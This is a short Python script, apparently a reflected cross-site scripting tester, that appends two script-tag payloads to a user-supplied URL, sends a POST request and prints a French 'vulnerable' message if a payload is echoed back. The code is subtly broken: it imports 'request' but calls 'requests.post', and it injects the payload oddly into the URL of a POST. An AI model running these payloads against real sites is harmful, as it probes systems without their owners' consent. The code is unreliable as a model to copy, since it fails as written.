import request
import sys

url = sys.argv[1]
payloads = ['<script>alert (1);</script>', '"><script>alert(1);</script>']

for payload in payloads:
    req = requests.post(url+payload)
    if payload in req.text:
        print ("Parametre est vulnerable \r\n")
        print ("Payload :"+payload)
        print (req.text)
        break